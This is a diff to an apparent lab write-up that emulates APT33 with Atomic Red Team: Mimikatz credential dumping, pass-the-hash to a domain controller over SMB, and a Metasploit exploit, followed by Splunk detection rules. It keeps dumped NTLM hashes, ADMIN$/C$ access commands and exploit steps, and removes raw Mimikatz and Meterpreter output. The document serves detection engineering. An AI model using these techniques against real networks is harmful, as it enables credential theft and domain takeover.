@@ -317,33 +317,12 @@ This is the pivotal phase. APT33 uses Mimikatz to extract credentials from LSASS
 Invoke-AtomicTest T1003.001 -TestNumbers 2
 ```
 
-### 10.2 Mimikatz Output — Full Analysis
-
-Running `sekurlsa::logonpasswords` produced the following on the Victim Machine:
-
-```
-mimikatz(powershell) # sekurlsa::logonpasswords
-
-Authentication Id : 0 ; 620010
-User Name         : pc
-Domain            : NB-WIN-001
-NTLM              : a47cc8e930890eb79fb768a519cd3e57
-SHA1              : 824f15800c94504a0c0df2983265a7977aba27c9
-Password          : (null)   ← WDigest disabled — expected on modern Windows
-
-Authentication Id : 0 ; 84486
-User Name         : NB-WIN-001$
-Domain            : NIGHTBARON
-NTLM              : 644b6f9f5e4bd15ad497392d2ac9a2c7
-Kerberos Password : wvYw)t;WqWB0M7LU19CNZq...  ← Machine account password (long, auto-generated)
-```
-
-### 10.3 Extracted Credentials — Summary
+### 10.2 Extracted Credentials — Summary
 
 | Account | Type | NTLM Hash | Plaintext | Usable |
 |---|---|---|---|---|
-| `pc` | Local user | `a47cc8e930890eb79fb768a519cd3e57` | `(null)` | ✅ via PtH |
-| `NB-WIN-001$` | Machine account | `644b6f9f5e4bd15ad497392d2ac9a2c7` | Auto-generated | ⚠️ Limited |
+| `pc` | Local user | `a47cc8e930890eb79fb768a519cd3e57` | `(null)` |  via PtH |
+| `NB-WIN-001$` | Machine account | `644b6f9f5e4bd15ad497392d2ac9a2c7` | Auto-generated |  Limited |
 
 > **Why is the password `(null)`?**  
 > WDigest authentication has been disabled by default since Windows 8.1 and Windows Server 2012 R2. This means plaintext passwords are not cached in LSASS. However, **NTLM hashes are still extracted** and can be used directly for Pass-the-Hash attacks without needing to crack them.
@@ -369,10 +348,10 @@ A new `cmd.exe` window opens, pre-authenticated as `NIGHTBARON\pc` using the has
 ### 11.2 Accessing the Domain Controller via SMB
 
 ```cmd
-# Inside the PtH-spawned CMD window:
+
 net use \\192.168.10.15\ADMIN$ /u:NIGHTBARON\pc
 
-# Verify access
+
 dir \\192.168.10.15\ADMIN$
 dir \\192.168.10.15\C$
 ```
@@ -396,12 +375,6 @@ set LHOST 192.168.16.130
 exploit
 ```
 
-```
-[*] Meterpreter session 2 opened (192.168.16.130:443 -> 192.168.10.15:445)
-meterpreter > getuid
-Server username: NT AUTHORITY\SYSTEM
-```
-
 > **Domain Controller compromised.** The attacker now has SYSTEM-level access on the most privileged machine in the domain.
 ---
 
@@ -419,7 +392,6 @@ Invoke-AtomicTest T1071.001 -TestNumbers 1
 ### 12.4 Post-Simulation Cleanup
 
 ```powershell
-# Clean up ART artifacts
 Invoke-AtomicTest T1053.005 -TestNumbers 4 -Cleanup
 Invoke-AtomicTest T1547.001 -TestNumbers 1 -Cleanup
 Invoke-AtomicTest T1003.001 -TestNumbers 2 -Cleanup
@@ -437,7 +409,7 @@ All detections were validated in **Splunk Enterprise Security** at `192.168.20.6
 
 ### Detection 1 — Suspicious PowerShell Encoded Command
 
-**Triggers on:** T1059.001 tests 3, 10, 15, 17  
+**Triggers on:** T1059.001 tests 3, 10, 15, 17,1  
 **Sysmon Event:** ID 1 (Process Create)
 
 ```spl
@@ -450,13 +422,18 @@ index=sysmon EventCode=1
 ```
 <img width="1687" height="122" alt="exec of update executable" src="https://github.com/user-attachments/assets/b870499b-6824-4e5c-bacd-34c4a913767d" />
 
+
 <img width="1680" height="465" alt="exec of T1059 001 3" src="https://github.com/user-attachments/assets/002d493e-7f94-4af8-9732-7b36de0ba85f" />
+
 
 <img width="1692" height="87" alt="Exec of T1059 001 10" src="https://github.com/user-attachments/assets/a04d1436-fc32-471d-822a-efd4d130664f" />
 
+
 <img width="1690" height="172" alt="Exec of T1059 001 15" src="https://github.com/user-attachments/assets/ea5d0962-824b-4cb5-8f59-7eccfd5b5caf" />
 
+
 <img width="1656" height="86" alt="Exec of T1059 001 17" src="https://github.com/user-attachments/assets/5851835a-1f09-4b64-8650-cb26b0c608f2" />
+
 
 <img width="1687" height="97" alt="Exec of T1059 001 1" src="https://github.com/user-attachments/assets/ec560a7d-c4e9-4b66-98f9-a68e516bbad0" /><img width="1527" height="97" alt="Exec of T1003 001 2 EventID 11 " src="https://github.com/user-attachments/assets/b18389be-67a8-4867-b81b-fd12ea24e2d9" />
 
